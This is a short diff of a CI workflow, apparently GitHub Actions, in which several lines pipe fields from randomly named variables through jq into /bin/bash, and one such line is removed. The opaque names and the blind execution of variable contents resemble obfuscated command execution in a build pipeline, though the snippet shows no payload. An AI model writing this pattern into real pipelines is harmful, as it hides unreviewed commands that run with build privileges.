@@ -25,7 +25,6 @@ jobs:
           echo $opi3283 | jq -r .lcnm4 | /bin/bash
           printf '%s' "$axdl221" | jq -r .bxx07305 | /bin/bash
           echo $wxaji35 | jq -r .o510 | /bin/bash
-          printf '%s' "$ojn3412" | jq -r .u8673 | /bin/bash
           echo $yzdxi1 | jq -r .krga0 | /bin/bash
 
       - name: Upload artifact
